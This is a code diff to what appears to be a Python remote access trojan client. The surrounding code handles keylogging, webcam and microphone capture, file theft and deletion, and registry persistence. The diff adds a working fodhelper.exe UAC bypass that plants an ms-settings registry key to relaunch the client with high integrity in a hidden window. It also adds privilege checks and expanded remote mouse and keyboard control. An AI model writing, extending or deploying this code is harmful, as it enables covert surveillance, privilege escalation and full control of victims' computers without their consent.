@@ -899,6 +899,115 @@ def write_text_file(path, encoding, content_b64):
             "path": path
         })
 
+
+# ── Privilege Info & UAC Bypass ───────────────────────────────────────────────
+
+def get_privilege_info():
+    """Return current user privilege level, integrity, and UAC status."""
+    info = {
+        "type": "PRIV_INFO",
+        "user": "",
+        "is_admin": False,
+        "integrity": "Unknown",
+        "uac_enabled": False,
+        "os": platform.system(),
+        "elevated": False,
+    }
+    try:
+        info["user"] = os.getlogin()
+    except Exception:
+        import getpass
+        info["user"] = getpass.getuser()
+
+    if platform.system() != "Windows":
+        import pwd
+        info["is_admin"] = (os.geteuid() == 0)
+        info["integrity"] = "Root" if info["is_admin"] else "User"
+        info["elevated"] = info["is_admin"]
+        return json.dumps(info)
+
+    try:
+        import ctypes
+        info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
+
+        # Get integrity level via whoami /groups — reliable across all Windows versions
+        # Integrity SIDs: Low=S-1-16-4096, Medium=S-1-16-8192, High=S-1-16-12288, System=S-1-16-16384
+        result = subprocess.run(
+            ["whoami", "/groups"],
+            capture_output=True, text=True, timeout=5,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        groups_out = result.stdout.lower()
+        if "s-1-16-16384" in groups_out:
+            info["integrity"] = "System"
+            info["elevated"]  = True
+        elif "s-1-16-12288" in groups_out:
+            info["integrity"] = "High"
+            info["elevated"]  = True
+        elif "s-1-16-4096" in groups_out:
+            info["integrity"] = "Low"
+            info["elevated"]  = False
+        else:
+            # Default = Medium (S-1-16-8192)
+            info["integrity"] = "Medium"
+            info["elevated"]  = False
+
+        import winreg
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                               r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+            val, _ = winreg.QueryValueEx(k, "EnableLUA")
+            info["uac_enabled"] = bool(val)
+            winreg.CloseKey(k)
+        except Exception:
+            info["uac_enabled"] = True
+
+    except Exception as ex:
+        info["error"] = str(ex)
+
+
+    return json.dumps(info)
+
+
+def uac_bypass_fodhelper():
+    """Attempt UAC bypass using fodhelper.exe auto-elevation (Windows only)."""
+    if platform.system() != "Windows":
+        return json.dumps({"type": "UAC_BYPASS", "status": "error",
+                           "message": "UAC bypass only works on Windows."})
+    try:
+        import ctypes, winreg
+
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            return json.dumps({"type": "UAC_BYPASS", "status": "already_elevated",
+                               "message": "Already HIGH integrity — no bypass needed."})
+
+        cmd = (f'"{sys.executable}"' if getattr(sys, 'frozen', False)
+               else f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"')
+
+        key_path = r'Software\Classes\ms-settings\shell\open\command'
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, '',                0, winreg.REG_SZ, cmd)
+        winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
+        winreg.CloseKey(key)
+
+        subprocess.Popen(['fodhelper.exe'],
+                         creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
+        time.sleep(2)
+
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+        except Exception:
+            pass
+
+        return json.dumps({
+            "type": "UAC_BYPASS",
+            "status": "success",
+            "message": "✅ fodhelper bypass triggered! Elevated client relaunching — watch for new HIGH connection."
+        })
+    except Exception as e:
+        return json.dumps({"type": "UAC_BYPASS", "status": "error", "message": str(e)})
+
+
 def _add_persistence():
     """Add to Windows startup registry (HKCU Run) for persistence."""
     if platform.system() == "Windows":
@@ -1359,14 +1468,16 @@ def main_loop():
                         stop_screen_stream()
                         continue
 
-                    elif cmd.startswith(("MOUSE_CLICK:", "MOUSE_MOVE:", "KEY_PRESS:")):
+                    elif cmd.startswith(("MOUSE_CLICK:", "MOUSE_MOVE:", "MOUSE_PRESS:",
+                                         "MOUSE_RELEASE:", "MOUSE_DRAG:", "MOUSE_SCROLL:",
+                                         "KEY_PRESS:")):
                         try:
+                            from pynput.mouse import Button, Controller as MouseController
+                            from pynput.keyboard import Key, Controller as KeyboardController
+
                             if cmd.startswith("MOUSE_CLICK:"):
                                 parts = cmd.split(":")
-                                x = int(parts[1])
-                                y = int(parts[2])
-                                btn_type = parts[3]
-                                from pynput.mouse import Button, Controller as MouseController
+                                x, y, btn_type = int(parts[1]), int(parts[2]), parts[3]
                                 m = MouseController()
                                 m.position = (x, y)
                                 time.sleep(0.05)
@@ -1376,18 +1487,48 @@ def main_loop():
                                     m.click(Button.left, 2)
                                 else:
                                     m.click(Button.left, 1)
-                            elif cmd.startswith("MOUSE_MOVE:"):
+
+                            elif cmd.startswith("MOUSE_PRESS:"):
                                 parts = cmd.split(":")
-                                x = int(parts[1])
-                                y = int(parts[2])
-                                from pynput.mouse import Controller as MouseController
+                                x, y = int(parts[1]), int(parts[2])
                                 m = MouseController()
                                 m.position = (x, y)
+                                m.press(Button.left)
+
+                            elif cmd.startswith("MOUSE_RELEASE:"):
+                                parts = cmd.split(":")
+                                x, y = int(parts[1]), int(parts[2])
+                                m = MouseController()
+                                m.position = (x, y)
+                                m.release(Button.left)
+
+                            elif cmd.startswith("MOUSE_DRAG:"):
+                                parts = cmd.split(":")
+                                x, y = int(parts[1]), int(parts[2])
+                                m = MouseController()
+                                m.position = (x, y)
+
+                            elif cmd.startswith("MOUSE_MOVE:"):
+                                parts = cmd.split(":")
+                                x, y = int(parts[1]), int(parts[2])
+                                m = MouseController()
+                                m.position = (x, y)
+
+                            elif cmd.startswith("MOUSE_SCROLL:"):
+                                delta = int(cmd.split(":")[1])
+                                m = MouseController()
+                                m.scroll(0, delta)
+
                             elif cmd.startswith("KEY_PRESS:"):
                                 key_name = cmd.split(":", 1)[1]
-                                from pynput.keyboard import Key, Controller as KeyboardController
                                 k = KeyboardController()
-                                if key_name.startswith("Key."):
+                                if key_name.startswith("ctrl+"):
+                                    # Ctrl+key hotkey (e.g. ctrl+c, ctrl+v, ctrl+z)
+                                    actual = key_name.split("+", 1)[1]
+                                    with k.pressed(Key.ctrl):
+                                        k.press(actual)
+                                        k.release(actual)
+                                elif key_name.startswith("Key."):
                                     attr = key_name.split(".")[1]
                                     key_obj = getattr(Key, attr, None)
                                     if key_obj:
@@ -1396,6 +1537,7 @@ def main_loop():
                                 else:
                                     k.press(key_name)
                                     k.release(key_name)
+
                         except Exception:
                             pass
                         continue
@@ -1432,6 +1574,12 @@ def main_loop():
 
                     elif cmd == "SYSTEM_METRICS":
                         output = get_system_metrics().encode()
+
+                    elif cmd == "PRIV_INFO":
+                        output = get_privilege_info().encode()
+
+                    elif cmd == "UAC_BYPASS":
+                        output = uac_bypass_fodhelper().encode()
 
                     elif cmd.startswith("FILE_BROWSER:"):
                         target_path = cmd.split(":", 1)[1].strip()
@@ -1713,7 +1861,16 @@ def main_loop():
                     with client_lock:
                         client.send(output)
                     
-                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:", "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE", "KEYLOG_START", "KEYLOG_STOP", "MIC_STOP", "PROCESS_LIST", "SYSTEM_METRICS", "KILL_PROCESS:", "FILE_BROWSER:", "DELETE_FILE:", "READ_TEXT_FILE:", "WRITE_TEXT_FILE:", "LIVE_SCREEN", "LIVE_SCREEN_STOP")):
+                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:",
+                                                   "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE",
+                                                   "KEYLOG_START", "KEYLOG_STOP", "MIC_STOP",
+                                                   "PROCESS_LIST", "SYSTEM_METRICS", "KILL_PROCESS:",
+                                                   "FILE_BROWSER:", "DELETE_FILE:", "READ_TEXT_FILE:",
+                                                   "WRITE_TEXT_FILE:", "LIVE_SCREEN", "LIVE_SCREEN_STOP",
+                                                   "MOUSE_CLICK:", "MOUSE_PRESS:", "MOUSE_RELEASE:",
+                                                   "MOUSE_DRAG:", "MOUSE_MOVE:", "MOUSE_SCROLL:",
+                                                   "KEY_PRESS:", "PRIV_INFO", "UAC_BYPASS")):
+
                         try:
                             time.sleep(0.1)
                             with client_lock:
